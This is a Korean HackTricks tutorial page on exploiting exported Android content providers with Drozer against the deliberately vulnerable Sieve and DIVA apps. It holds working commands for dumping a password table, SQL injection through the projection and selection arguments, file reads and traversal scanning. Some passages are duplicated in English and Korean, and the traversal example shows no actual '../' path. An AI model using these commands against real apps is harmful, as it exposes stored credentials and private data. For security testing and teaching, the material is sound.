# Content Providers 악용하기

## Content Providers 악용하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 소개

데이터는 **컨텐츠 프로바이더**라는 구성 요소를 통해 다른 애플리케이션으로 요청에 따라 **공급**됩니다. 이러한 요청은 **ContentResolver 클래스**의 메서드를 통해 관리됩니다. 컨텐츠 프로바이더는 **데이터베이스**, **파일** 또는 **네트워크**와 같은 다양한 위치에 데이터를 저장할 수 있습니다.

_Manifest.xml_ 파일에서 컨텐츠 프로바이더의 선언이 필요합니다. 예를 들어:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
`content://com.mwr.example.sieve.DBContentProvider/Keys`에 접근하려면 `READ_KEYS` 권한이 필요합니다. 흥미로운 점은 개발자의 실수로 `/Keys`를 보호하지만 `/Keys/` 경로는 액세스 가능하다는 것입니다.

**아마도 개인 데이터에 접근하거나 취약점(SQL Injection 또는 Path Traversal)을 이용할 수 있습니다.**

## **노출된 콘텐츠 제공자**로부터 정보 가져오기
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
**DBContentProvider**에 도달하는 방법은 "content://"로 시작하는 URI를 사용하여 조각을 모으는 것이 가능합니다. 이 접근 방식은 Drozer를 사용하여 얻은 통찰력에 기반하며, 중요한 정보는 _/Keys_ 디렉토리에 위치해 있습니다.

Drozer는 **여러 개의 URI를 추측하고 시도**할 수 있습니다:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
**ContentProvider 코드**를 확인하여 쿼리를 검색해야합니다:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

또한, 전체 쿼리를 찾을 수 없는 경우 `onCreate` 메서드에서 ContentProvider에 의해 선언된 이름을 확인할 수 있습니다:

![](<../../../.gitbook/assets/image (186).png>)

쿼리는 다음과 같을 것입니다: `content://name.of.package.class/declared_name`

## **데이터베이스를 지원하는 Content Provider**

아마도 대부분의 Content Provider는 **데이터베이스**의 **인터페이스**로 사용됩니다. 따라서 액세스할 수 있다면 정보를 **추출, 업데이트, 삽입 및 삭제**할 수 있을 것입니다.\
**민감한 정보에 액세스**할 수 있는지 확인하거나 **인증 우회**를 시도해보세요.

Content Provider의 코드를 확인할 때 _query, insert, update 및 delete_와 같은 이름의 **함수**도 찾아보십시오:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

이 함수들을 호출할 수 있을 것입니다.

### 콘텐츠 쿼리
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### 내용 삽입

데이터베이스를 쿼리하여 **열의 이름**을 알 수 있으며, 이후에 데이터를 데이터베이스에 삽입할 수 있습니다:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_삽입 및 업데이트에서는 --string을 사용하여 문자열을 나타내고, --double을 사용하여 double을 나타내며, --float, --integer, --long, --short, --boolean을 사용할 수 있습니다._

### 내용 업데이트

열의 이름을 알고 있다면 **항목을 수정**할 수도 있습니다:

![](<../../../.gitbook/assets/image (190).png>)

### 내용 삭제

![](<../../../.gitbook/assets/image (191).png>)

### **SQL 인젝션**

콘텐츠 제공자에 전달되는 **프로젝션** 및 **선택 필드**를 조작하여 SQL 인젝션 **(SQLite)**을 테스트하는 것은 간단합니다.\
콘텐츠 제공자를 쿼리할 때 정보를 검색하기 위해 2가지 흥미로운 인수가 있습니다: _--selection_ 및 _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

이 **매개 변수**를 **남용**하여 SQL 인젝션을 테스트해 볼 수 있습니다:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Drozer에 의한 자동 SQLInjection 탐지**

Drozer is an Android security assessment framework that allows you to perform various security tests on Android applications. One of the features of Drozer is the ability to automatically discover SQL injection vulnerabilities in Android applications.

Drozer는 Android 애플리케이션에 대해 다양한 보안 테스트를 수행할 수 있는 Android 보안 평가 프레임워크입니다. Drozer의 기능 중 하나는 Android 애플리케이션에서 자동으로 SQL 인젝션 취약점을 발견할 수 있는 능력입니다.

To use this feature, you need to have Drozer installed on your machine and have a rooted Android device connected to it. Once you have everything set up, you can follow the steps below to automatically discover SQL injection vulnerabilities using Drozer.

이 기능을 사용하려면 Drozer를 설치한 후 루팅된 Android 기기를 연결해야 합니다. 모든 설정이 완료되면 아래의 단계를 따라 Drozer를 사용하여 자동으로 SQL 인젝션 취약점을 발견할 수 있습니다.

1. Open a terminal and start Drozer by running the command `drozer console connect`.

   터미널을 열고 `drozer console connect` 명령을 실행하여 Drozer를 시작합니다.

2. Once Drozer is connected to your Android device, you can use the `run app.provider.finduri` command to find the content providers in the target application.

   Drozer가 Android 기기에 연결되면 `run app.provider.finduri` 명령을 사용하여 대상 애플리케이션의 콘텐츠 프로바이더를 찾을 수 있습니다.

3. After finding the content providers, you can use the `run app.provider.query` command to perform SQL injection tests on the identified content providers.

   콘텐츠 프로바이더를 찾은 후 `run app.provider.query` 명령을 사용하여 식별된 콘텐츠 프로바이더에 대해 SQL 인젝션 테스트를 수행할 수 있습니다.

4. Drozer will automatically generate and execute SQL injection payloads on the content providers. If any vulnerabilities are found, Drozer will display the results.

   Drozer는 콘텐츠 프로바이더에 대해 자동으로 SQL 인젝션 페이로드를 생성하고 실행합니다. 취약점이 발견되면 Drozer가 결과를 표시합니다.

By following these steps, you can leverage Drozer's automatic SQL injection discovery feature to identify and exploit SQL injection vulnerabilities in Android applications. This can help you assess the security of Android apps and protect against potential attacks.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **파일 시스템을 지원하는 콘텐츠 제공자**

콘텐츠 제공자는 **파일에 접근하는 데에도 사용될 수 있습니다:**

![](<../../../.gitbook/assets/image (193).png>)

### **파일 읽기**

콘텐츠 제공자에서 파일을 읽을 수 있습니다.
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **경로 순회**

파일에 접근할 수 있다면, 경로 순회를 악용해 볼 수 있습니다 (이 경우에는 필요하지 않지만 "_../_"와 같은 트릭을 사용해 볼 수 있습니다).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Drozer에 의한 자동 경로 순회 발견**

Drozer는 안드로이드 애플리케이션의 취약점을 검사하는 데 사용되는 강력한 도구입니다. 이 도구를 사용하여 자동 경로 순회 취약점을 발견할 수 있습니다. 경로 순회 취약점은 애플리케이션의 콘텐츠 제공자(Content Provider)에 대한 액세스 제어 부재로 인해 발생할 수 있습니다.

Drozer를 사용하여 경로 순회 취약점을 발견하려면 다음 단계를 따르세요:

1. Drozer를 설치하고 실행합니다.
2. `run app.package.list` 명령을 사용하여 설치된 애플리케이션의 패키지 목록을 확인합니다.
3. 취약한 애플리케이션의 패키지 이름을 선택하고 `run app.provider.finduri <package_name>` 명령을 실행합니다.
4. 결과에서 경로 순회 취약점을 확인할 수 있습니다.

Drozer를 사용하여 자동 경로 순회 취약점을 발견하는 것은 애플리케이션의 보안 취약점을 식별하고 해결하기 위한 중요한 단계입니다. 이를 통해 악의적인 사용자가 애플리케이션의 중요한 데이터에 액세스하는 것을 방지할 수 있습니다.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## 참고 자료

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기법을 공유**하세요.

</details>
